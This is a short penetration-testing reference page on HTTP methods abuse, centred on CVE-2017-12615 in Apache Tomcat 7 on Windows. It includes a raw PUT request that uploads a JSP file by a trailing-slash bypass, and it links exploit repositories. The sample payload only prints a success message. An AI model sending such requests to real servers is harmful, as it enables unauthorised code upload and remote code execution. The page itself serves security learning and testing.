# 🛠️ HTTP methods abuse

## Theory

Some HTTP methods \(a.k.a. verbs\) can be used for malicious purposes: PUT, DELETE, etc.

The HTTP methods abuse not aimed at gaining access to a specific page like verb tampering but more like what methods are accepted by the server and how can we profit from those

{% embed url="https://github.com/ShutdownRepo/httpmethods" %}

## CVE-2017-12615 - Apache Tomcat PUT

This vulnerability targets Apache Tomcat 7.0.0 to 7.0.79 running on Windows. By design, you are not allowed to upload JSP files via the PUT method on the Apache Tomcat servers. This is likely a security measure to prevent an attacker from uploading a JSP shell and gaining remote code execution on the server. However, due to the insufficient checks, an attacker could gain remote code execution on Apache Tomcat servers from version 7.0.0 to version 7.0.79 where the PUT method is enabled.

The request to upload a JSP file to the server is as simple as that:

```text
PUT /myfile.jsp/
Host: domain-name:port
Connection: close
Content-Length: 85

<% out.write("<html><body><h3>[+] JSP upload successfully.</h3></body></html>"); %>
```

You can also exploit it using curl : [https://github.com/breaktoprotect/CVE-2017-12615\#exploit-using-curl](https://github.com/breaktoprotect/CVE-2017-12615#exploit-using-curl)

{% embed url="https://github.com/breaktoprotect/CVE-2017-12615" %}

